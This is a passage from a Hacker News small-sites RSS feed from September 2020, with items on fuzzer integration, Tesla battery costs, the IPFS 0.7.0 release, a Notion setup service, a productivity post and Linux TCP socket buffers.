writing a proper parser, they can significantly improve code coverage.
Searching for the file extension with Google also brings very good results.</p>

<p>If the project does not provide tests or corpora, the only remaining option is
to generate a useful set of files manually: in the case of text formats, it is
easy to find relevant information in the code and use it in your files.
Binary files can often be obtained using conversion tools included in the project.
All you need to do is to find a file in a format supported by
the converter and script it to generate the output. Finally, I would like to remind you
once again to minimize the file sizes.</p>

<p>One of the key elements causing increased code coverage are
dictionaries - text files containing constants for a given file format. This
saves the CPU time that would otherwise be needed to perform the initial
validation of key elements of the tested format. Dictionaries from AFL
and libFuzzer are compatible with each other - the initial ‚Äúcorpora‚Äù of the
dictionaries can be found in
<a href="https://github.com/google/fuzzing/tree/master/dictionaries">https://github.com/google/fuzzing/tree/master/dictionaries</a>.</p>



<p>libFuzzer‚Äôs originator and Google employee, Kostya Serebryany, proposed to
extend the classic continuous integration approach to fuzzing. Due to the fact
that libFuzzer fuzzers are very similar to unit tests, and unit tests alone
are not able to saturate the security tests, this approach is worth considering
in the project testing cycle.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/testing_developing_fuzzing.svg" alt="Testing, Developing, Fuzzing"></p>

<p>Based on libFuzzer, Google launched in December 2016 an open-source project
fuzzing service called OSS-Fuzz. Each open-source project developer can apply
for testing their own application. The only requirement is to write your own
fuzzer and create a pull-request to the Google repository.</p>

<p>At the time of writing the article there were 25,000 VMs available for OSS-Fuzz.
From its start, the project helped to find more than 11,000 different problems in the
following projects: OpenSSL, ffmpeg, LibreOffice, sqlite3 and freetype2.</p>

<p>Integrating an efficient fuzzer into your project has never been so easy and
cheap. In the era of (almost) cost-free computing power and easy access to cloud
servers, it is worthwhile to ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.moritz.systems/blog/how-to-integrate-a-fuzzer-with-your-project/">https://www.moritz.systems/blog/how-to-integrate-a-fuzzer-with-your-project/</a></em></p>]]>
            </description>
            <link>https://www.moritz.systems/blog/how-to-integrate-a-fuzzer-with-your-project/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579207</guid>
            <pubDate>Thu, 24 Sep 2020 14:56:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Do Musical Scales Have Certain Numbers of Notes?]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24579111">thread link</a>) | @lucaspauker
<br/>
September 24, 2020 | https://www.lucaspauker.ml/articles/16 | <a href="https://web.archive.org/web/*/https://www.lucaspauker.ml/articles/16">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.lucaspauker.ml/articles/16</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579111</guid>
            <pubDate>Thu, 24 Sep 2020 14:48:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elon Musk Promises a Next-Gen Battery Equipped $25,000 Electric Car]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579050">thread link</a>) | @elorant
<br/>
September 24, 2020 | https://plus.auczar.com/elon-musk-promises-a-next-gen-battery-equipped-25000-electric-car/ | <a href="https://web.archive.org/web/*/https://plus.auczar.com/elon-musk-promises-a-next-gen-battery-equipped-25000-electric-car/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><span>Tesla announced that it will considerably reduce the asking prices of its battery cells and packs, meaning, the company‚Äôs next goal is a $25,000 electric car.</span></p>
<p><span>It looks like Tesla will soon be coming with a new electric car carrying a $25,000 price tag. The company‚Äôs chief executive Elon Musk said its new ‚Äútabless‚Äù battery cells, and changing the materials used inside the cell, will enable the company to have the price per kilowatt-hour, which will enable them to make electric cars about the same price as combustion engine cars.</span></p>
<p><span>The kWh price per (kilowatt-hour) is the unit of energy, ideally used to measure the capacity packed by the battery inside modern electric vehicles. Those prices have been significantly declining over the last decade, from $1,100/kWh in 2010 to $156/kWh in 2019, a drop of 87 percent.</span></p>
<p><span>Experts suggest that the price is likely to hit $100/kWh by 2023, but Musk said Tesla will initiate a three-year process to bring the price below that, but did not reveal the exact price target. There is more to a battery than just its cell.</span></p>
<p><span>A lithium-ion battery cell that would normally cost you $100/kWh to produce mean a battery pack, with its additional components including cooling systems and battery management, could set you back $125‚Äì$130/kWh or more.</span></p>
<p><span>Today‚Äôs battery packs cost about $10,000‚Äì$12,000, based on their capacity. Reduced battery prices could pave the way for more affordable, higher volume electric cars. Tesla is bent on bringing the cost of future packs down to $6,000 or less, putting the cell cost under $100/kWh.</span></p>
<p><span>The average price of electric cars in the United States continues to drop ‚Äì from $64,300 in 2018 to $55,600 last year, a 13.4 percent decline. That‚Äôs primarily because of Tesla‚Äôs Model 3.</span></p>
<p><span>This is still high as compared to the average price of a gas-burning vehicle at $36,600. It is worth mentioning here that the price has been ticking upward recently.</span></p>
<p><span>The Model 3 was originally slated to be Tesla‚Äôs first car for the broader market. Tesla‚Äôs master plan from early on, as outlined by Musk in a <a href="https://www.tesla.com/blog/secret-tesla-motors-master-plan-just-between-you-and-me?redirect=no" target="_blank" rel="noopener noreferrer">blog post</a> in 2006, revolves around how it would build a highly appealing electric sports car in a bid to convince buyers that EVs can be cool too, use the revenue from there to bankroll a more affordable luxury sedan, and use the funds from the effort into building a car that people could buy without burning a hole in their pockets.</span></p>
<p><span>Due to Tesla‚Äôs well documented ‚Äúproduction hell,‚Äù Musk‚Äôs plan to build a $35,000 Model 3 did not come to fruition. The Model 3 Standard Range Plus starts at $37,990, the Performance starts at $54,990, and the Long Range starts at $46,990.</span></p>
<p><span>Musk first promised a $25,000 EV two years ago, which he said was possible within three years. ‚ÄúI think in order for us to get up to‚Ä¶a 25,000 car, that‚Äôs something we can do,‚Äù Musk said in an interview with YouTuber Marques Brownlee.</span></p>
<blockquote>
<p dir="ltr" lang="en">Musk: ‚ÄúLong-term we want to make about 20 million vehicles per year‚Äù</p>
<p>That‚Äôs roughly twice the production volume of Toyota, GM, or Volkswagen.</p>
<p>‚Äî E.W. Niedermeyer (@Tweetermeyer) <a href="https://twitter.com/Tweetermeyer/status/1308536403018440704?ref_src=twsrc%5Etfw">September 22, 2020</a></p></blockquote>

<p><span>‚ÄúBut if we work really hard I think maybe we can do that in about three years,‚Äù he explained. At <a href="https://plus.auczar.com/live-how-to-watch-tesla-battery-day-reveal-expect-big-surprises/" target="_blank" rel="noopener noreferrer">Battery Day</a> Musk made a new prediction hinting at 20 million cars a year, which roughly is twice the current production of Volkswagen, GM, or Toyota, author of Ludicrous: the Unvarnished Story of Tesla Motors Ed Niedermeyer tweeted.</span></p>
<p><iframe src="https://www.youtube.com/embed/MevKTPN4ozw" width="560" height="315" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
<!-- AI CONTENT END 1 -->
</div></div>]]>
            </description>
            <link>https://plus.auczar.com/elon-musk-promises-a-next-gen-battery-equipped-25000-electric-car/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579050</guid>
            <pubDate>Thu, 24 Sep 2020 14:42:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[IPFS 0.7.0, the SECIO retirement edition]]>
            </title>
            <description>
<![CDATA[
Score 116 | Comments 44 (<a href="https://news.ycombinator.com/item?id=24578953">thread link</a>) | @georgyo
<br/>
September 24, 2020 | https://blog.ipfs.io/2020-09-24-go-ipfs-0-7-0/ | <a href="https://web.archive.org/web/*/https://blog.ipfs.io/2020-09-24-go-ipfs-0-7-0/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

    


    <div>
      
      <p>by Jacob Heun &amp; Adin Schmahmann on 2020-09-24</p>

      

      

<p>In August we announced the <a href="https://blog.ipfs.io/2020-08-07-deprecating-secio/">deprecation of the SECIO security transport</a>. In this release we have disabled SECIO by default, which will have an impact on older nodes on the network. The best way to mitigate the impact of this change is to <a href="https://docs.ipfs.io/recent-releases/go-ipfs-0-7/update-procedure">upgrade your IPFS nodes</a> as soon as possible! Not only will upgrading ensure you‚Äôre using the latest security transports, you‚Äôll get access to all of the <a href="https://blog.ipfs.io/2020-07-20-dht-deep-dive/">performance improvements</a> we‚Äôve made this year to content routing.</p>

<p>With this release you will also start seeing more Peer IDs and IPNS Keys on the network that start with <code>1</code> instead of the typical <code>Qm</code>. This is due to a switch to ed25519 keys being used by default over RSA keys, which you can read more about in the highlights below.</p>

<p>üö® For those of you using plugins with IPFS there is a breaking change detailed below to the build process.</p>



<h2 id="secio-is-now-disabled-by-default">üîí SECIO is now disabled by default</h2>

<p>As part of deprecating and removing support for the SECIO security transport, we have disabled it by default. TLS1.3 will remain the default security transport with fallback to Noise. You can read more about the deprecation in the blog post, <a href="https://blog.ipfs.io/2020-08-07-deprecating-secio/">https://blog.ipfs.io/2020-08-07-deprecating-secio/</a>. If you‚Äôre running Go IPFS older than 0.5 or JS IPFS older than 0.47, this may start to impact your performance on the public network, so we strongly encourage you to upgrade today!</p>

<h2 id="ed25519-keys-are-now-used-by-default">üóùÔ∏è Ed25519 keys are now used by default</h2>

<p>Previously go-ipfs generated 2048 bit RSA keys for new nodes, but it will now use ed25519 keys by default. This will not affect any existing keys, but newly created keys will be ed25519 by default. The main benefit of using ed25519 keys over RSA is that ed25519 keys have an inline public key. This means that someone only needs your PeerId to verify things you‚Äôve signed, such as your Peer Records or in the future Signed Provider Records, which means we don‚Äôt have to worry about storing bulky RSA public keys.</p>

<h3 id="rotating-keys">Rotating keys</h3>

<p>Along with switching the default key type, we‚Äôve added support for rotating Identity keys. If you would like to change the key type of your IPFS node, you can now do so with the rotate command. <strong>NOTE: This will affect your Peer Id, so be sure you want to do this!</strong> Your existing identity key will be backed up in the Keystore so that it can still be referenced for things like IPNS records.</p>

<pre><code>$ ipfs key rotate -o my-old-key -t ed25519
</code></pre>

<h2 id="key-export-import">üì¶ Key export/import</h2>

<p>Speaking of backing up keys, we‚Äôve added commands to allow you to export and import keys from the IPFS Keystore to a local .key file. This does not currently apply to the IPFS identity key, <code>self</code>, which is housed in the configuration file.</p>

<pre><code>$ ipfs key gen mykey
$ ipfs key export -o mykey.key mykey # ./&lt;name&gt;.key is the default path
$ ipfs key import mykey mykey.key # on another node
</code></pre>

<h2 id="ipns-paths-now-encode-the-key-name-as-a-base36-cidv1-by-default">#Ô∏è‚É£ IPNS paths now encode the key name as a base36 CIDv1 by default</h2>

<p>Previously go-ipfs encoded the key names for IPNS paths as base58btc multihashes (e.g. <code>Qmabc...</code>). We now encode them as base36 encoded CIDv1s as defined in the <a href="https://github.com/libp2p/specs/blob/master/peer-ids/peer-ids.md#string-representation">peerID spec</a> (e.g. <code>k51xyz...</code>) which also deals with the encoding of public keys. This is nice because it means that IPNS keys will by default be case-insensitive and that they will fit into DNS labels (e.g. <code>k51xyz...ipns.localhost</code>) and therefore that subdomain gateway redirections (e.g. from <code>localhost:8080/ipns/{key}</code> to <code>{key}.ipns.localhost</code>) will look better to users in the default case.</p>

<p>Many commands will accept a <code>--ipns-base</code> option that allows changing command outputs to use a particular encoding (i.e.  base58btc multihash, or CIDv1 encoded in any supported base):</p>

<pre><code>$ ipfs key list -l --ipns-base b58mh
12D3KooWCjhz69LskTZEC5vFWs8eDpHo7kYbGzrC5EjU75BHSmVK self
$ ipfs key list -l --ipns-base base36
k51qzi5uqu5dh9ihj4p2v5sl3hxvv27ryx2w0xrsv6jmmqi91t9xp8p9kaipc2 self
</code></pre>

<h2 id="multiaddresses-now-accept-peerids-encoded-as-cidv1">üìÆ Multiaddresses now accept PeerIDs encoded as CIDv1</h2>

<p>In preparation for eventually changing the default PeerID representation multiaddresses can now contain strings like <code>/p2p/k51xyz...</code> in addition to the default <code>/p2p/Qmabc...</code>. There is a corresponding <code>--peerid-base</code> option to many functions that output peerIDs:</p>

<pre><code>$ ipfs id --format "&lt;id&gt;" --peerid-base b58mh
12D3KooWCjhz69LskTZEC5vFWs8eDpHo7kYbGzrC5EjU75BHSmVK
$ ipfs id --format "&lt;id&gt;" --peerid-base base36
k51qzi5uqu5dh9ihj4p2v5sl3hxvv27ryx2w0xrsv6jmmqi91t9xp8p9kaipc2
</code></pre>

<h2 id="dag-stat-command">üßÆ <code>dag stat</code> command</h2>

<p>Initial support has been added for the <code>ipfs dag stat</code> command. Running this command will traverse the DAG for the given root CID and report statistics. By default, progress will be shown as the DAG is traversed. Supported statistics currently include DAG size and number of blocks.</p>

<pre><code>$ ipfs dag stat bafybeihpetclqvwb4qnmumvcn7nh4pxrtugrlpw4jgjpqicdxsv7opdm6e # the IPFS webui
Size: 30362191, NumBlocks: 346
</code></pre>

<h2 id="plugin-build-changes">üö® Plugin build changes üö®</h2>

<p>We have changed the build flags used by the official binary distributions on <a href="https://dist.ipfs.io/">dist.ipfs.io</a> (or <code>/ipns/dist.ipfs.io</code>) to use the simpler and more reliable <code>-trimpath</code> flag instead of the more complicated and brittle <code>-asmflags=all=-trimpath="$(GOPATH)" -gcflags=all=-trimpath="$(GOPATH)"</code> flags, however the build flags used by default in go-ipfs remain the same.</p>

<p>The scripts in <a href="https://github.com/ipfs/go-ipfs-example-plugin">go-ipfs-example-plugin</a> have been updated to reflect this change. This is a <strong>breaking change</strong> to how people have been building plugins against the dist.ipfs.io binary of go-ipfs and plugins should update their build processes accordingly. See <a href="https://github.com/ipfs/go-ipfs-example-plugin/pull/9">go-ipfs-example-plugin/pull/9</a> for details.</p>

<h2 id="the-changelog">The Changelog</h2>

<p>For a full list of updates included in this release you can review the Changelog at <a href="https://github.com/ipfs/go-ipfs/blob/v0.7.0/CHANGELOG.md#v070-2020-09-22">https://github.com/ipfs/go-ipfs/blob/v0.7.0/CHANGELOG.md#v070-2020-09-22</a>.</p>

<h2 id="thank-you-contributors">Thank you contributors!</h2>

<p>A huge thank you to <a href="https://github.com/ipfs/go-ipfs/blob/v0.7.0/CHANGELOG.md#contributors">everyone who contributed</a> patches and improvements in this release, all <strong>53</strong> of you! We couldn‚Äôt have made this happen without your help and feedback. ‚ù§</p>

<h2 id="install-upgrade-and-join-us">Install, upgrade, and join us!</h2>

<p>You can get started by <a href="https://dist.ipfs.io/#go-ipfs">installing go-ipfs</a> or <a href="https://docs.ipfs.io/recent-releases/go-ipfs-0-7/update-procedure">upgrading to go-ipfs 0.7</a>.</p>

<p>There are many ways to get involved with IPFS based on your skill set, interest, and availability.  Please check out <a href="https://github.com/ipfs/community/blob/master/CONTRIBUTING.md">our contribution page</a> on GitHub for guidance and next steps.</p>

<p>This is an exciting time for IPFS and the web in general. Join us!</p>


      
          
          
          
      
    </div>
  </div></div>]]>
            </description>
            <link>https://blog.ipfs.io/2020-09-24-go-ipfs-0-7-0/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578953</guid>
            <pubDate>Thu, 24 Sep 2020 14:33:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Ready-Made CRM, Project and Content Management on Notion]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24578943">thread link</a>) | @saviorand
<br/>
September 24, 2020 | https://optemization.com/preconceived | <a href="https://web.archive.org/web/*/https://optemization.com/preconceived">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article id="/preconceived"><div id="/df2631fcf3ab4d74bfb32255cee6151d"><div id="/f3a8a7556e534222be5e49e6fb2c9ef6"><blockquote id="/7100cd2e553b454ab5102d49c9c9c48f"><span><span>Functional Notion workspaces take hours to create. To setup yourself and your team, you'd have to learn, ideate, build, iterate, and train. Let Optemization take care of this.

</span><span><strong>In two weeks flat.</strong></span></span></blockquote></div></div><h3><span id="/8dc73654f3b645b18006ee25d1bb0cfc"></span><span><span>üì¶ Components</span></span></h3><div id="/74c3d09ab64f4127abaeac25d78eed42"><div id="/a9f4c8f2706a40b19028c89ec97026e8"><p><span><span><strong>Foundational Databases</strong></span></span></p><p><span><span>‚Üí Eleven databases with properties and templates pre-built</span></span></p><ul><li id="/b56f8c313d22445ba331a9c56073cbed"><span><span>Project management suite with for task, calendar, project databases</span></span></li><li id="/7a82c37bf18a42cab68dadea85212342"><span><span>CRM suite with company, people, industry, geography databases</span></span></li><li id="/fd5f5c66de8f4986a9a784efdd6e8e39"><span><span>Resources suite with for content, topic databases</span></span></li><li id="/8ea94eb3df3c4ffa99ca78e24503cdfe"><span><span>Workspace hierarchy with three top-level pages</span></span></li><li id="/d44e005dffc84274af7dcf2f68ec130f"><span><span>Eleven database templates</span></span></li><li id="/e819d910acab47168608f868293a6a83"><span><span>$1000 credit</span></span></li><li id="/8cfdf53823ed4f6199f85397682457af"><span><span>1 hour onboarding meeting</span></span></li></ul></div></div><div id="/ce69d2f7689448ce8af6af68c6950bb9"><div id="/9987596c4d4e4e7099539209c83d70a7"><p><span><span><strong>Personalized Dashboards</strong></span></span></p><p><span><span>‚Üí Three customizable dashboards</span></span></p><ul><li id="/1bcf8781b59b47dbb85e426df06d2455"><span><span>Personal dashboard</span></span></li><li id="/b567781f9eb94096a4981739aa8bf700"><span><span>Vertical project dashboard</span></span></li><li id="/ea8517dbc1f34b49acc9333437539481"><span><span>Horizontal project dashboard</span></span></li><li id="/ecd1c7606e4c4229909eb2a4e5d786f5"><span><span>Dashboard component library</span></span></li><li id="/fe950994c03143f9b89b0f2adc7b44d0"><span><span>1 hour personalization meeting</span></span></li></ul></div></div><div id="/c43afe7bd97e4eb69e857db6c0b2abde"><div id="/d6f53f22277e4f6a9728ae71f6f03d77"><p><span><span><strong>Bonus Support</strong></span></span></p><ul><li id="/504337f059c94e02b38782626b35c482"><span><span>Shared Slack Connect channel</span><span><span>*</span></span></span></li><li id="/4b53e407064046d1b105399317f9e88c"><span><span>Curated Notion updates and content</span></span></li><li id="/fed65626c7414f0da78c7eeec6e5d222"><span><span>Discounts on future services and tools </span></span></li></ul><p><span><span>*Requires Standard Plan</span></span></p></div></div><h3><span id="/0b78decb95c24aa8b8771b3041080f4d"></span><span><span>üñ•Ô∏è Demo</span></span></h3><h3><span id="/56d6370823f34ff6bf3d2f2ddbfea3d5"></span><span><span>üìÜ Timeline</span></span></h3><p><span><span><strong>Six steps including two meetings (example dates).</strong></span></span></p><div id="/0de5b0f2af9944039b1a02342f8d0cd8"><div id="/5ea01ed9dfb244ae829b371d5c8a7ef9"><p><span><span><strong>üóøStart Installation</strong></span></span></p><p><span><span>üí¨</span><span><strong>Onboarding Meeting</strong></span></span></p><p><span><span>üì¶</span><span><strong>Ship Databases</strong></span></span></p><p><span><span>üí¨</span><span><strong>Customization Meeting</strong></span></span></p><p><span><span>üì¶</span><span><strong>Ship Dashboards</strong></span></span></p><p><span><span><strong>üóøCompletion Installation</strong></span></span></p></div><div id="/20f078e837764769ac3290a5f4ba6221"><p><span><span>Oct 5, 2020</span></span></p><p><span><span>Oct 5, 2020</span></span></p><p><span><span>Oct 12, 2020</span></span></p><p><span><span>Oct 12, 2020</span></span></p><p><span><span>Oct 19, 2020</span></span></p><p><span><span>Oct 19, 2020</span></span></p><p><span><span><strong>14 days</strong></span></span></p></div></div><h3><span id="/fdd2e4c53e3848a7ade37b394d8b9430"></span><span><span>üí≥ Pricing</span></span></h3><p><span><span><strong>$3,000. Split up as follows</strong></span></span></p><div id="/24038df326844c6693e5f7ecf3dcc093"><div id="/9ed4fc58aaec46cb9f76ca91e51408b5"><p><span><span>üßæ</span><span><strong>Deposit Payment</strong></span></span></p><p><span><span><strong>üì¶Add Credit</strong></span></span></p><p><span><span>üßæ</span><span><strong>Final Payment</strong></span></span></p></div></div><h3><span id="/6d214b8077b04c56a2b46d400dc03207"></span><span><span>üîí Checkout</span></span></h3><p><span><span><strong>You will not be charged immediately.</strong></span></span></p></article></div></div>]]>
            </description>
            <link>https://optemization.com/preconceived</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578943</guid>
            <pubDate>Thu, 24 Sep 2020 14:32:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Declare bankruptcy and don‚Äôt be ashamed of it]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24578858">thread link</a>) | @mcrittenden
<br/>
September 24, 2020 | https://critter.blog/2020/09/24/declare-bankruptcy-and-dont-be-ashamed-of-it/ | <a href="https://web.archive.org/web/*/https://critter.blog/2020/09/24/declare-bankruptcy-and-dont-be-ashamed-of-it/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">

	
<article id="post-1461">

	
<!-- .entry-header -->

	<div>

		<div>

			
<p>I‚Äôm not talking about financial bankruptcy. I‚Äôm talking about all the other kinds of bankruptcy:</p>



<ul><li>Email bankruptcy (anything important will come back up)</li><li>Backlog bankruptcy (because <a href="https://critter.blog/2020/09/03/backlogs-are-not-idea-buckets/">Backlogs are not idea&nbsp;buckets</a>)</li><li>Books-to-read list bankruptcy (if your TBR list is 100+ books long, it‚Äôs not doing you any good)</li><li>Slack inbox bankruptcy (i.e., the first-day-back-from-vacation feeling)</li><li>Wiki bankruptcy (<a href="https://critter.blog/2020/08/10/wiki-bankruptcy/">I wrote about this one before</a>)</li><li>Social networking notification bankruptcy (this shouldn‚Äôt even be a question)</li><li>Browser tab bankruptcy (you can find stuff again when you to, but you won‚Äôt)</li><li>Garage/attic bankruptcy (don‚Äôt try to go through it, pay someone to haul it all away)</li></ul>



<p>If you feel like declaring bankruptcy is a failure, stop that. It‚Äôs not a failure. It‚Äôs a fresh start. It‚Äôs a powerful tool and we should take advantage of it. It‚Äôs a weight lifted. </p>



<p>If your washing machine breaks, you can spend hours and hours learning how to fix the stupid thing, or you can toss it and buy a new one. Buying a new one is nothing to be ashamed of. It‚Äôs practical. You‚Äôre declaring dryer bankruptcy (I know the metaphor is a stretch, shut up).</p>



<p>Sure, if you declare bankruptcy on the same thing over and over, then you should examine your patterns about that thing. Bankruptcy is a voice that says ‚Äúwhat can you do to make it unnecessary to do this again?‚Äù </p>



<p>Try it. Declare bankruptcy and <a href="https://twitter.com/mcrittenden">come tell me</a> if you don‚Äôt feel ten times better afterwards.</p>

		</div><!-- .entry-content -->

	</div><!-- .post-inner -->

	<!-- .section-inner -->

	
	<!-- .pagination-single -->

	
</article><!-- .post -->

</div></div>]]>
            </description>
            <link>https://critter.blog/2020/09/24/declare-bankruptcy-and-dont-be-ashamed-of-it/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578858</guid>
            <pubDate>Thu, 24 Sep 2020 14:22:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why your application should not be responsible for delivering logs]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578707">thread link</a>) | @jerodsanto
<br/>
September 24, 2020 | https://dev.sweatco.in/centralized-logging-delivery/ | <a href="https://web.archive.org/web/*/https://dev.sweatco.in/centralized-logging-delivery/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p><a href="https://dev.sweatco.in/centralized-logging-solution/">In a previous article</a>, we looked at the overall architecture of our logging system and how it has evolved. In this article we will look at the frequent problems that we have to deal with when interacting with processes on different instances, which we also have to deal with in the process of constructing an ideal logging system. But we will also cover the main topic of our article - <strong>why your application should not be responsible for delivering logs</strong>. </p><p>When transferring data from one host to another host or a program on one instance to a program on another instance, we face with the concept of interprocess communication (<strong>IPC</strong>) in Linux.</p><h2 id="tcp-or-stream-sockets-in-action">TCP or stream-sockets in action</h2><p>In order for one program to transmit a message to another program, an abstraction in the form of <strong><em>ports</em></strong> was invented. Knowing the TCP address of the computer, we know where to send, and knowing the port to which we can send messages, assuming that the program "owning" this port can pick up this data from there. Thus, we abstract from specific program identifiers.</p><p>Another useful abstraction in linux that makes life easier for a programmer is a <strong>file</strong>. A <em>device</em>, a <em>file on a disk</em> or a <em>network</em> - you will always work with the <code>file</code> abstraction. In case of network interaction, you will work with <em><strong>sockets</strong></em> - special "files" intended for exchanging messages on the network.</p><p>There are two types of sockets: <em><strong>stream-socket</strong></em> and <strong><em>datagram-socket</em></strong>.</p><!--kg-card-begin: markdown--><ul>
<li><em>Stream-socket</em> can be represented as <strong>an entry / exit point</strong> of an endless river of bytes (note that the byte sequence, otherwise it will not be a stream).</li>
<li><em>Datagram-socket</em> can be thought of as your personal <strong>mailbox</strong>, which is ready to receive letters or telegrams (a sequential and limited set of bytes), but the number of such messages cannot exceed the size of your mailbox.</li>
</ul>
<!--kg-card-end: markdown--><p>The guarantees that follow from the definition of <em>stream-socket</em> can be provided both at the <em><strong>local level</strong></em> (UNIX domain) and at the <em><strong>network level</strong></em> (IPv4 or IPv6 domain). <em>At the network level</em>, such guarantees are implemented by the TCP or <strong>Transmission Control Protocol</strong>. I would like to focus on the fact that the type of socket is more important here, and not the domain (UNIX or IPv4/IPv6) in which it works.</p><blockquote>A protocol is a standard that describes the format and interaction of data transfer. For example, sending ordinary letters via post office can also be called a transfer protocol - on such letters we need to indicate the sender and recipient in a certain format, and also pay for the sending, etc.</blockquote><p>Having created the <em>stream socket</em> (linux api function <em><strong>socket</strong></em>) and <em>port</em>, we need to somehow "connect" them (linux api function <em><strong>bind</strong></em>), and then we are ready to start receiving messages from the clients that transmit them (linux api function <em><strong>listen</strong></em>).</p><figure><img src="https://dev.sweatco.in/content/images/2020/07/Logging-part1.svg" alt=""></figure><p><em><strong>The Linux API function</strong> is an available C language function that allows you to "officially" perform actions in user space linux using the Linux kernel system resources and services. Interpreted languages such as python and ruby can wrap C language functions in their own libraries and classes, providing greater convenience and development speed with such functions.</em></p><p>After this stage, the <strong>client</strong> can also create a stream socket (linux api function <strong><em>socket</em></strong>) and then connect (linux api function <em><strong>connect</strong></em>).</p><figure><img src="https://dev.sweatco.in/content/images/2020/06/Logging-part2.svg" alt=""></figure><blockquote>Usually, at this point, illustrations or explanations of how the 3-way handshake and further details of establishing a connection between programs begin to appear. But, as a rule, such details become relevant when there are any errors in establishing a connection or in the process of information transfer between the clients.</blockquote><p>After the connection is established, we can start sending messages. But here, our next question awaits - what to do if the message is lost and who guarantees its' delivery? If linux guarantees delivery of a message after it is received from the application, then it needs a <strong>buffer</strong> for the delivery time, in case linux needs to send them again in case of loss. The same is true in the opposite case, when a part of a message comes and the receiving application has not yet managed to process it. Thus, <strong>we need a buffer</strong> for <em>receiving</em> and <em>sending</em> both on the sending side and on the receiving side.</p><figure><img src="https://dev.sweatco.in/content/images/2020/07/Logging-TCP.svg" alt=""></figure><p>In the figure, we see that each client socket creates a buffer for receiving and sending at the Linux level. But a curious developer immediately has a lot of questions:</p><!--kg-card-begin: markdown--><ul>
<li>what is the size of the socket buffer</li>
<li>what happens when the buffer size is exceeded
<ul>
<li>server side</li>
<li>client side</li>
</ul>
</li>
<li>Is the buffer on the listening socket shared, or is it as separate as on the clients?</li>
<li>whether it is necessary to increase the size of such buffers and how large they should be made</li>
</ul>
<!--kg-card-end: markdown--><p>We will conduct an empirical experiment on ruby (yes, best language in the world) and try to find the answers.</p><!--kg-card-begin: html--><a href="https://asciinema.org/a/z4iODpZMeSV1k5S4PGFGRTS5S" target="_blank"><img src="https://asciinema.org/a/z4iODpZMeSV1k5S4PGFGRTS5S.svg"></a><!--kg-card-end: html--><p>In the lower left corner we can see Socket Stat ( <code>ss</code>) for all stream sockets that are connected to port <code>19_019</code> (note also that netstat is showing at the same time). What we can find out when viewing this window:</p><!--kg-card-begin: markdown--><ol>
<li>LISTEN socket <code>*: 19_019</code> in the Send-Q column shows the size of the backlog (the max number of connections waiting to be <strong>accepted</strong> - as we can see from the Recv-Q column, it can accept <code>backlog + 1</code> the number of waiting ESTABLISHED connections). Once again, I want to note that <strong>the connection has already been established</strong> (!) - the client can send messages there (imagine that you were allowed to queue to make an order, but you have not yet made payment)</li>
<li>After connecting the client to the server, we see two ESTABLISHED sockets - the server <code>127.0.0.1:19019 -&gt; 127.0.0.1: 37242</code> and the client <code>127.0.0.1:37242 -&gt; 127.0.0.1: 19019</code> (we are the server and client create on one instance).</li>
<li>The client and server socket have their own Recv and Send buffers</li>
<li>When the Recv buffer overflows on the server, the client buffer holds the rest of the data in the local Send buffer.</li>
</ol>
<!--kg-card-end: markdown--><blockquote>And another important point that I want to focus on is that the data in the buffer belongs to the operating system, and not to our process (!), which means that we will not see memory consumption at the process level until we start taking data from there.</blockquote><p>Let's see what happens to the client when it tries to connect when the queue of connections waiting to be accepted is full</p><!--kg-card-begin: html--><a href="https://asciinema.org/a/jtoePFOPVbyMT3oWK87RWCMQg" target="_blank"><img src="https://asciinema.org/a/jtoePFOPVbyMT3oWK87RWCMQg.svg"></a><!--kg-card-end: html--><p>As we can see, it is blocked and the connection is in the SYN-SENT state (our client application does not know this). After accepting the first socket, we get the first messages from the buffer (!)</p><p>It is important that <code>socket1</code> for a very long time ‚Äúthinks‚Äù that the data <em>has been sent</em>, <strong>although</strong> practically all this time they were in the linux buffer both on the server and on the client (!).</p><p>Is it true that the buffer is <code>981_788</code> bytes? Let's send the message again and see, after picking up the message that is still in the buffer.</p><!--kg-card-begin: html--><a href="https://asciinema.org/a/tx1FI1aZh9DOnldNyqqmvZOxS" target="_blank"><img src="https://asciinema.org/a/tx1FI1aZh9DOnldNyqqmvZOxS.svg"></a><!--kg-card-end: html--><p>After further experiments, we see that the buffer size increased and reached a size of <code>5_901_199</code> bytes. More than <strong>5 MB</strong> is in the linux buffer, which are waiting for their turn to be processed by the application. And if there will be <code>1_000</code> of such connections?</p><p>You can also make sure that if the buffer is empty, the connection is blocked until messages appear in it (here golang developers can recall <code>go-channels</code> - a very similar behavior).</p><p>Thus, we see the following default behavior of tcp in modern linux:</p><!--kg-card-begin: 